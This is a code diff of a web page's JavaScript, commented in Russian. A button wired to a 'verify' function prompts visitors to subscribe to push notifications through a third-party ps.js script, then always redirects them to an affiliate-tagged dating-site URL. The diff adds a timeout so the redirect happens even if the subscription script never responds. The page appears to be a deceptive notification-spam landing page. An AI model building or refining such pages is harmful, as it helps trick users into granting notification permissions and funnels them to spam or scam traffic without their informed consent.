@@ -115,7 +115,7 @@
 
     <script>
     // Ссылка для редиректа
-    const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d& Equalsother&j1=1&s1=96847&s2=2070502&s3=yd0';
+    const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';
 
     // Функция для выполнения редиректа
     function performRedirect() {
@@ -139,27 +139,40 @@
         // Проверяем наличие API от ps.js
         if (window.ps && typeof window.ps.showPrompt === 'function') {
             console.log('Вызываем подписку через ps.js');
-            window.ps.showPrompt().then(result => {
-                console.log('Результат подписки:', result);
-                performRedirect(); // Редирект после ответа
-            }).catch(err => {
-                console.error('Ошибка вызова подписки:', err);
-                performRedirect(); // Редирект при ошибке
-            });
+            // Устанавливаем таймер на случай, если ps.js не вернет результат
+            const timeout = setTimeout(() => {
+                console.log('Тайм-аут: ps.js не вернул результат, выполняем редирект');
+                performRedirect();
+            }, 5000); // 5 секунд ожидания
+
+            window.ps.showPrompt()
+                .then(result => {
+                    clearTimeout(timeout); // Отменяем таймер
+                    console.log('Результат подписки:', result);
+                    performRedirect(); // Редирект после ответа
+                })
+                .catch(err => {
+                    clearTimeout(timeout); // Отменяем таймер
+                    console.error('Ошибка вызова подписки:', err);
+                    performRedirect(); // Редирект при ошибке
+                });
         } else {
             console.log('API ps.js не доступен, используем Notification API');
             // Запасной вариант: Notification API
             if ('Notification' in window) {
                 if (Notification.permission === 'granted' || Notification.permission === 'denied') {
+                    console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
                     performRedirect();
                 } else {
-                    Notification.requestPermission().then(permission => {
-                        console.log('Результат разрешения:', permission);
-                        performRedirect();
-                    }).catch(err => {
-                        console.error('Ошибка Notification API:', err);
-                        performRedirect();
-                    });
+                    Notification.requestPermission()
+                        .then(permission => {
+                            console.log('Результат разрешения:', permission);
+                            performRedirect(); // Редирект после любого ответа
+                        })
+                        .catch(err => {
+                            console.error('Ошибка Notification API:', err);
+                            performRedirect(); // Редирект при ошибке
+                        });
                 }
             } else {
                 console.log('Уведомления не поддерживаются');
@@ -185,6 +198,7 @@
 
     // Событие на клик по кнопке
     document.getElementById('submit-button').addEventListener('click', verify);
+        
 </script>
 
     <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q" async></script>
